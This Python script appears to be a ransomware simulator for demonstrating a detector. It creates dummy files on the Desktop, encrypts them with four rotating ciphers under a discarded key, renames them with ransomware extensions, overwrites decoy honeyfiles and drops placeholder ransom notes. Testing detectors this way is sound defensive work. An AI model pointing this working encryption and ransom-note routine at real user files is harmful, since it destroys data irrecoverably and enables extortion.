from __future__ import annotations
import os
import sys
import time
import struct
import hashlib
from pathlib import Path
 
TARGET_DIR = Path.home() / "Desktop" / "target"
 

def encrypt_aes_cbc(data: bytes, key: bytes) -> bytes:
    # AES-256-CBC with PKCS7 padding. used by WannaCry, Dharma, Ryuk
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
    iv = os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(pad(data, AES.block_size))
 
 
def encrypt_aes_ctr(data: bytes, key: bytes) -> bytes:
    # AES-256-CTR (stream mode). used by Maze, Conti
    from Crypto.Cipher import AES
    nonce = os.urandom(8)
    cipher = AES.new(key, AES.MODE_CTR, nonce=nonce)
    return nonce + cipher.encrypt(data)
 
 
def encrypt_chacha20(data: bytes, key: bytes) -> bytes:
    # ChaCha20 stream cipher. used by STOP/Djvu and modern families
    from Crypto.Cipher import ChaCha20
    nonce = os.urandom(8)
    cipher = ChaCha20.new(key=key, nonce=nonce)
    return nonce + cipher.encrypt(data)
 
 
def encrypt_fernet(data: bytes, key: bytes) -> bytes:
    # Fernet (AES-128-CBC + HMAC)
    from cryptography.fernet import Fernet
    import base64
    # Fernet needs a 32-byte URL-safe base64 key
    fernet_key = base64.urlsafe_b64encode(key[:32])
    f = Fernet(fernet_key)
    return f.encrypt(data)
 
 
CIPHERS = [
    ("AES-CBC",   ".locked",  encrypt_aes_cbc),
    ("AES-CTR",   ".enc",     encrypt_aes_ctr),
    ("ChaCha20",  ".wncry",   encrypt_chacha20),
    ("Fernet",    ".dharma",  encrypt_fernet),
]


SAMPLE_FILES = {
    "reports": [
        ("Q1_Financial_Report.docx", b"PK\x03\x04" + b"\x00" * 50 + b"Financial data Q1 2024 revenue expenses profits margins..." * 200),
        ("employee_list.xlsx",       b"PK\x03\x04" + b"\x00" * 50 + b"Name,Department,Salary,Start Date\nJohn,Engineering,75000,2022\n" * 300),
        ("project_plan.pdf",         b"%PDF-1.4\n" + b"Project timeline milestones deliverables resource allocation..." * 250),
    ],
    "photos": [
        ("family_vacation.jpg",  b"\xff\xd8\xff\xe0" + os.urandom(800) + b"\x00" * 200),
        ("graduation_2024.png",  b"\x89PNG\r\n\x1a\n" + os.urandom(600) + b"\x00" * 200),
    ],
    "documents": [
        ("thesis_draft.txt",     b"Chapter 1: Introduction to Ransomware Detection Systems\n" * 500),
        ("meeting_notes.docx",   b"PK\x03\x04" + b"\x00" * 50 + b"Meeting agenda action items follow up decisions deadline..." * 200),
        ("budget_2024.xlsx",     b"PK\x03\x04" + b"\x00" * 50 + b"Category,Q1,Q2,Q3,Q4\nSalaries,50000,51000,52000,53000\n" * 300),
    ],
}
 
 
def cmd_setup():
    # create realistic target files on Desktop
    print(f"[SETUP] Creating target files in {TARGET_DIR}")
    for folder, files in SAMPLE_FILES.items():
        folder_path = TARGET_DIR / folder
        folder_path.mkdir(parents=True, exist_ok=True)
        for name, content in files:
            file_path = folder_path / name
            file_path.write_bytes(content)
            size_kb = len(content) / 1024
            print(f"  Created: {folder}/{name} ({size_kb:.1f} KB)")
 
    total = sum(len(f) for f in SAMPLE_FILES.values())
    print(f"\n[SETUP] Done. {total} files created across {len(SAMPLE_FILES)} folders.")
    print(f"[SETUP] Path: {TARGET_DIR}")
 
 
def cmd_attack():
    # execute a multi-cipher ransomware simulation
    if not TARGET_DIR.exists():
        print("[ERROR] Target directory not found. Run 'setup' first.")
        sys.exit(1)
 
    key = os.urandom(32)
 
    # collect all target files
    targets = sorted([
        f for f in TARGET_DIR.rglob("*")
        if f.is_file()
        and not f.name.startswith("HOW_TO_DECRYPT")
        and f.suffix.lower() not in {
            ".locked", ".encrypted", ".enc", ".crypted", ".crypt", ".cry",
            ".wncry", ".wncryt", ".wannacry", ".locky", ".zepto", ".odin",
            ".thor", ".osiris", ".cerber", ".cerber2", ".cerber3", ".lockbit",
            ".ryk", ".dharma", ".wallet", ".phobos", ".acute", ".conti",
            ".hive", ".basta", ".clop", ".cl0p", ".medusa", ".gdcb",
            ".crab", ".krab", ".shade", ".rnsmwr", ".ransom", ".pays",
            ".damage",
        }
    ])
 
    if not targets:
        print("[ERROR] No target files found. Run 'setup' first.")
        sys.exit(1)
 
    print(f"[ATTACK] Ransomware simulation starting...")
    print(f"[ATTACK] Target: {TARGET_DIR}")
    print(f"[ATTACK] Files found: {len(targets)}")
    print()
    time.sleep(2)
 
    # phase 1: touch honeyfile if present
    # the detector plants honeyfiles in watched directories
    # a real ransomware would encounter them while walking the tree
    honeyfile_names = {
        "passwords.docx", "financial_report_2024.xlsx",
        "backup_credentials.txt", "company_stuff.pdf",
        "personal_photos.zip",
    }
    touched_honeyfile = False
    for item in TARGET_DIR.iterdir():
        if item.name in honeyfile_names and item.is_file():
            print(f"  [HONEYFILE] Touching decoy: {item.name}")
            # overwrite with ciphertext like a real ransomware would
            data = item.read_bytes()
            ciphertext = encrypt_aes_cbc(data, key)
            # keep handle open briefly so PID resolver can catch it
            with open(item, "wb") as fh:
                fh.write(ciphertext)
                fh.flush()
                time.sleep(0.5)
            touched_honeyfile = True
            break
 
    if not touched_honeyfile:
        # check parent directory (Desktop) for scattered honeyfiles
        desktop = Path.home() / "Desktop"
        for item in desktop.iterdir():
            if item.name in honeyfile_names and item.is_file():
                print(f"  [HONEYFILE] Touching decoy: {item.name}")
                data = item.read_bytes()
                with open(item, "wb") as fh:
                    fh.write(encrypt_aes_cbc(data, key))
                    fh.flush()
                    time.sleep(0.5)
                touched_honeyfile = True
                break
 
    if touched_honeyfile:
        print(f"  [HONEYFILE] Honeyfile signal triggered (60 pts)")
    print()
 
    # phase 2: encrypt files with rotating ciphers
    # each file gets a different cipher, cycling through all four
    # we keep file handles open during writes so the PID resolver can map this process to the file operations.
    encrypted_count = 0
    for i, file_path in enumerate(targets):
        cipher_name, ext, encrypt_fn = CIPHERS[i % len(CIPHERS)]
        rel = file_path.relative_to(TARGET_DIR)
        print(f"  [{cipher_name:8s}] Encrypting: {rel}")

        # Step 1: Read original content
        if not file_path.exists():
            print(f"  [BLOCKED] Quarantined by detector: {rel}")
            continue
        plaintext = file_path.read_bytes()
 
        # Step 2: Encrypt
        try:
            ciphertext = encrypt_fn(plaintext, key)
        except Exception as e:
            print(f"           Error with {cipher_name}: {e}")
            continue
 
        # step 3: overwrite with ciphertext
        # use open() with explicit flush to keep handle open longer
        # so PID resolver and process inspector can detect the I/O
        with open(file_path, "wb") as fh:
            fh.write(ciphertext)
            fh.flush()
            os.fsync(fh.fileno())
            # hold handle open briefly, this is what makes the PID resolver work: it scans open_files() every 2s
            time.sleep(0.3)
 
        # brief pause so watchdog processes the MODIFIED event
        # before we trigger the MOVED event
        time.sleep(0.2)
 
         # step 4: rename with ransomware extension
        if not file_path.exists():
            print(f"  [BLOCKED] Quarantined before rename: {rel}")
            continue
        locked_path = file_path.with_name(file_path.name + ext)
        try:
            file_path.rename(locked_path)
        except (FileNotFoundError, PermissionError):
            print(f"  [BLOCKED] Quarantined during rename: {rel}")
            continue
        encrypted_count += 1
 
        # small delay between files (realistic ransomware pace) but fast enough to trigger burst detector
        time.sleep(0.15)
 
    print(f"\n  [{encrypted_count} files encrypted across 4 ciphers]")
    print()
 
    # phase 3: drop ransom notes
    note_content = (
        "YOUR FILES HAVE BEEN ENCRYPTED\n"
        "=============================================\n"
        "\n"
        "All your documents, photos, and spreadsheets\n"
        "have been encrypted with military-grade\n"
        "encryption. To recover your files, send 1 BTC\n"
        "to the following address:\n"
        "\n"
        "  bc1q[simulated_bitcoin_address_for_demo]\n"
        "\n"
        "Contact: decrypt_support@[simulated].onion\n"
        "\n"
        "WARNING: Do not attempt to decrypt files\n"
        "manually or they will be permanently lost.\n"
        "\n"
    )
 
    note_count = 0
    # drop in every subdirectory
    for folder in TARGET_DIR.rglob("*"):
        if folder.is_dir():
            note_path = folder / "HOW_TO_DECRYPT_YOUR_FILES.txt"
            note_path.write_text(note_content)
            note_count += 1
 
    # also drop in root
    root_note = TARGET_DIR / "HOW_TO_DECRYPT_YOUR_FILES.txt"
    root_note.write_text(note_content)
    note_count += 1
 
    print(f"  [RANSOM NOTE] Dropped {note_count} ransom notes")
    print()
 
    # ── Summary ──────────────────────────────────────────────
    print(f"[ATTACK] Simulation complete.")
    print(f"[ATTACK] {encrypted_count} files encrypted")
    print(f"[ATTACK] {note_count} ransom notes dropped")
    print(f"[ATTACK] Honeyfile touched: {'Yes' if touched_honeyfile else 'No'}")
    print()
    
 
def cmd_cleanup():
    # remove all demo artifacts
    import shutil
    import stat

    def force_remove(func, path, exc_info):
        # remove read-only flag and retry
        try:
            os.chmod(path, stat.S_IWRITE)
            func(path)
        except Exception:
            pass

    if TARGET_DIR.exists():
        shutil.rmtree(TARGET_DIR, onerror=force_remove)
        print(f"[CLEANUP] Removed {TARGET_DIR}")
    else:
        print(f"[CLEANUP] Nothing to clean.")

    rd_dir = Path.home() / ".ransomware-detector"
    if rd_dir.exists():
        shutil.rmtree(rd_dir, onerror=force_remove)
        print(f"[CLEANUP] Removed {rd_dir}")
 
 
if __name__ == "__main__":
    if len(sys.argv) < 2 or sys.argv[1] not in ("setup", "attack", "cleanup"):
        print("Usage: python demo_attack.py [setup|attack|cleanup]")
        print()
        print("  setup    Create sample target files on Desktop")
        print("  attack   Run simulated ransomware attack")
        print("  cleanup  Remove all demo files and detector state")
        sys.exit(1)
 
    cmd = sys.argv[1]
    if cmd == "setup":
        cmd_setup()
    elif cmd == "attack":
        cmd_attack()
    elif cmd == "cleanup":
        cmd_cleanup()